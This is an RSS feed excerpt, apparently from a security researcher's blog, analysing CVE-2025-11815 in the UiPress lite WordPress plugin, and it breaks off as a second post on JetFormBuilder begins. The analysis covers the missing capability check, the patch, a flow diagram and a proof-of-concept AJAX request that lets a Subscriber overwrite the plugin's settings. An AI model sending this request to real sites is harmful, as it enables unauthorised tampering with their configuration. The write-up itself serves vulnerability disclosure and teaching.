class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Ajax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;check_referer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;current_user_can&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;manage_options&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Ajax&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;You&amp;ensp;do&amp;ensp;not&amp;ensp;have&amp;ensp;permission&amp;ensp;to&amp;ensp;perform&amp;ensp;this&amp;ensp;action&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;uipress-lite&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;manage_options&lt;/code&gt; is an administrator-level capability, so only admins can execute these AJAX actions.&lt;/p&gt;&#xA;&lt;p&gt;All AJAX callbacks registered above are now protected by the same mechanism in the patched version.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;Authenticated&amp;ensp;user&amp;ensp;(Subscriber&amp;ensp;or&amp;ensp;higher)&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;Dashboard&amp;ensp;renders&amp;ensp;→&amp;ensp;&#39;uip-security-nonce&#39;&amp;ensp;is&amp;ensp;available&amp;ensp;to&amp;ensp;all&amp;ensp;logged-in&amp;ensp;users&#34;]&#xD;&#xA;--&gt;&amp;ensp;C[&#34;Attacker&amp;ensp;sends&amp;ensp;AJAX&amp;ensp;request:&amp;ensp;action=uip_save_site_option&#34;]&#xD;&#xA;--&gt;&amp;ensp;D[&#34;Hook&amp;ensp;triggered:&amp;ensp;wp_ajax_uip_save_site_option&#34;]&#xD;&#xA;--&gt;&amp;ensp;E[&#34;Ajax::check_referer()&amp;ensp;validates&amp;ensp;nonce&amp;ensp;—&amp;ensp;passes&#34;]&#xD;&#xA;--&gt;&amp;ensp;F[&#34;No&amp;ensp;capability&amp;ensp;check&amp;ensp;is&amp;ensp;performed&#34;]&#xD;&#xA;--&gt;&amp;ensp;G[&#34;uip_save_site_option()&amp;ensp;executes&#34;]&#xD;&#xA;--&gt;&amp;ensp;H[&#34;Reads&amp;ensp;POST&amp;ensp;parameters:&amp;ensp;optionName&amp;ensp;+&amp;ensp;option&#34;]&#xD;&#xA;--&gt;&amp;ensp;I[&#34;Calls&amp;ensp;UipOptions::update()&#34;]&#xD;&#xA;--&gt;&amp;ensp;J[&#34;update_option(&#39;uip-global-settings&#39;,&amp;ensp;attacker-controlled&amp;ensp;data)&#34;]&#xD;&#xA;--&gt;&amp;ensp;K[&#34;Plugin&amp;ensp;settings&amp;ensp;overwritten&amp;ensp;by&amp;ensp;a&amp;ensp;low-privileged&amp;ensp;user&#34;]&#xD;&#xA;&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Log in using a Subscriber account&lt;/li&gt;&#xA;&lt;li&gt;Extract the nonce from the admin Dashboard&lt;/li&gt;&#xA;&lt;li&gt;Send the request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-admin/admin-ajax.php&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Host&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;localhost&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;subcriber+_cookie&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;action=uip_save_site_option&amp;amp;security=e032057458&amp;amp;option={payload}&amp;amp;optionName=remote-sync&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---&amp;ensp;Before&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql&amp;gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&amp;ensp;*&amp;ensp;from&amp;ensp;wp_options&amp;ensp;where&amp;ensp;&lt;span class=&#34;nv&#34;&gt;option_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uip-global-settings&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-----------+---------------------+------------------------------------------------------------------------------+----------+&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;option_id&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;option_name&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;option_value&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;autoload&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-----------+---------------------+------------------------------------------------------------------------------+----------+&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;m&#34;&gt;363&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;uip-global-settings&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;a:1:&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;s:11:&lt;span class=&#34;s2&#34;&gt;&amp;#34;remote-sync&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;a:1:&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;s:3:&lt;span class=&#34;s2&#34;&gt;&amp;#34;key&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;s:27:&lt;span class=&#34;s2&#34;&gt;&amp;#34;uip-692c7c8dd99844.95568294&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;auto&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-----------+---------------------+------------------------------------------------------------------------------+----------+&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;&amp;ensp;row&amp;ensp;in&amp;ensp;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00&amp;ensp;sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--&amp;ensp;After&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mysql&amp;gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&amp;ensp;*&amp;ensp;from&amp;ensp;wp_options&amp;ensp;where&amp;ensp;&lt;span class=&#34;nv&#34;&gt;option_name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uip-global-settings&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-----------+---------------------+----------------------------------------------+----------+&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;option_id&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;option_name&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;option_value&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;autoload&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-----------+---------------------+----------------------------------------------+----------+&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;m&#34;&gt;363&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;uip-global-settings&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;a:1:&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;s:11:&lt;span class=&#34;s2&#34;&gt;&amp;#34;remote-sync&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;O:8:&lt;span class=&#34;s2&#34;&gt;&amp;#34;stdClass&amp;#34;&lt;/span&gt;:0:&lt;span class=&#34;o&#34;&gt;{}}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&amp;ensp;auto&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-----------+---------------------+----------------------------------------------+----------+&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;&amp;ensp;row&amp;ensp;in&amp;ensp;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00&amp;ensp;sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Error Occurred&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-10-cve-2025-11815/err.png&#34; title=&#34;An error occurred while changing options&#34; data-thumbnail=&#34;/posts/2025-12-10-cve-2025-11815/err.png&#34; data-sub-html=&#34;&lt;h2&gt;Error&lt;/h2&gt;&lt;p&gt;An error occurred while changing options&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-10-cve-2025-11815/err.png&#39; alt=&#34;Error&#34; height=&#34;347&#34; width=&#34;1252&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;An error occurred while changing options&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in UiPress lite &amp;lt;= 3.5.08 originates from missing capability checks in AJAX callbacks for authenticated users, particularly the &lt;code&gt;uip_save_site_option()&lt;/code&gt; function. Although the plugin uses a nonce for CSRF protection, this nonce is provided to all users, including Subscribers. This enables any low-privileged account to directly invoke privileged AJAX actions and overwrite important plugin settings stored in &lt;code&gt;uip-global-settings&lt;/code&gt;. This is a Broken Access Control flaw allowing low-privilege users to modify admin-only data. The 3.5.09 patch fixes the issue by adding a &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt; capability check.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;A CSRF nonce alone is not secure&lt;/strong&gt; without a capability check on the action performed.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;All privileged AJAX actions must validate capability&lt;/strong&gt; before processing data.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonces visible to all users&lt;/strong&gt; can lead to abuse when combined with missing capability checks.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Low-privileged accounts must never be allowed to modify admin settings&lt;/strong&gt;, whether via AJAX or any other mechanisms.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce + capability check must always be paired&lt;/strong&gt; to prevent CSRF and privilege escalation issues.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/uipress-lite/vulnerability/wordpress-uipress-lite-plugin-3-5-08-missing-authorization-to-authenticated-subscriber-plugin-settings-update-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UiPress lite Plugin &amp;lt;= 3.5.08 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-64384 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-09-cve-2025-64384/</link>
      <pubDate>Tue, 09 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-09-cve-2025-64384/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-09-cve-2025-64384/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Missing Authorization&lt;/strong&gt; vulnerability in &lt;strong&gt;jetmonsters JetFormBuilder (jetformbuilder)&lt;/strong&gt; allows exploitation via &lt;strong&gt;Incorrectly Configured Access Control Security Levels&lt;/strong&gt;. This issue affects &lt;strong&gt;JetFormBuilder&lt;/strong&gt; from &lt;strong&gt;n/a&lt;/strong&gt; to &lt;strong&gt;&amp;lt;= 